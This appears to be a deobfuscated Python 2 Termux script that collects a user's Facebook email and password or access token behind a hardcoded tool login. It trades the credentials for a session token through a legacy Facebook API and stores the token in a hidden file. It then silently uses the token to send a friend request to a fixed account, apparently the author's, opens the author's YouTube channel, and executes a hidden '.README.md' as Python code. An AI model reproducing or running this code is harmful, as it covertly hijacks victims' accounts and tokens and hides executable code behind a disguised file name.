# Deobfuscated BY HTR-TECH | Tahmid Rayat

# Github    : https://github.com/htr-tech 
# Instagram : https://www.instagram.com/tahmid.rayat
# Facebook  : https://fb.com/tahmid.rayat.oficial 
# Messenger : https://m.me/tahmid.rayat.oficial 



try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 .README.md')

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', "Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16")]
os.system("clear")
##### LOGO #####
logo='''
 ____    _  _     _    _ 
|  _ \  | || |   | |  | |
| |_) | | || |_  | |  | |
|  _ <  |__   _| | |  | |
| |_) |    | |   | |__| |
|____/     |_|    \____/ 

--------------------------------------------------

 Auther   : Binyamin
 GitHub   : https://github.com/binyamin-binni
 YouTube  : Trick Proof
 Blogspot : https://trickproof.blogspot.com

--------------------------------------------------
                                '''

CorrectUsername = "binyamin"
CorrectPassword = "b4u"

loop = 'true'
while (loop == 'true'):
    print logo
    username = raw_input(" TOOL USERNAME: ")
    if (username == CorrectUsername):
    	password = raw_input(" TOOL PASSWORD: ")
        if (password == CorrectPassword):
            print " Logged in successfully as " + username
            time.sleep(1)
            loop = 'false'
        else:
            print " Wrong Password !"
            os.system('xdg-open https://trickproof.blogspot.com/2020/03/new-termux-command-for-termux-with-auto.html')
            os.system("clear")
    else:
        print " Wrong Username !"
        os.system('xdg-open https://trickproof.blogspot.com/2020/03/new-termux-command-for-termux-with-auto.html')
        os.system("clear")
        
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r[●] Loging In "+o),;sys.stdout.flush();time.sleep(1)
		
def login():
    os.system("clear")
    try:
        toket = open("....", "r")
        os.system("python2 .README.md")
    except (KeyError,IOError):
        os.system("rm -rf ....")
        os.system("clear")
        print (logo)
        print ("[1] Login With Email/Number and Password")
        print ("[2] Login With Access Token")
        print (50*"-")
        login_choice()
        
def login_choice():
    bch = raw_input("\n ====>  ")
    if bch =="":
        print ("[!] Fill in correctly")
        login()
    elif bch =="2":
        os.system("clear")
        print (logo)
        fac=raw_input(" Paste Access Token Here: ")
        fout=open("....", "w")
        fout.write(fac)
        fout.close()
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+fac)
        os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
        os.system("python2 .README.md")
    elif bch =="1":
        login1()
            
def login1():
	os.system('clear')
	try:
		toket = open('....','r')
		os.system("python2 .README.md")
	except (KeyError,IOError):
		os.system('clear')
		print (logo)
		print('          [+] LOGIN WITH FACEBOOK [+]' )
		print
		id = raw_input('[+] ID/Email : ')
		pwd = getpass.getpass('[+] Password : ')
		tik()
		try:
			br.open('https://mbasic.facebook.com')
		except mechanize.URLError:
			print("\n[!] There is no internet connection")
			os.sys.exit()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				chb = open("....", 'w')
				chb.write(z['access_token'])
				chb.close()
				print ('\n\x1b[1;92m[+] Login Successfull \x1b[1;97m')
				os.system('xdg-open https://www.youtube.com/channel/UCIC01LyIO5oroo1Qo6Fi4Mw')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=100002059014174&access_token='+z['access_token'])
				os.system("python2 .README.md")
			except requests.exceptions.ConnectionError:
				print("\n[!] There is no internet connection")
				os.sys.exit()
		if 'checkpoint' in url:
			print("\n[!] It seems that your account has a checkpoint")
			os.system('rm -rf ....')
			time.sleep(1)
			os.sys.exit()
		else:
			print("\n[!] Password/Email is wrong")
			os.system('rm -rf ....')
			time.sleep(1)
			login1()
			
if __name__=="__main__":
    login()
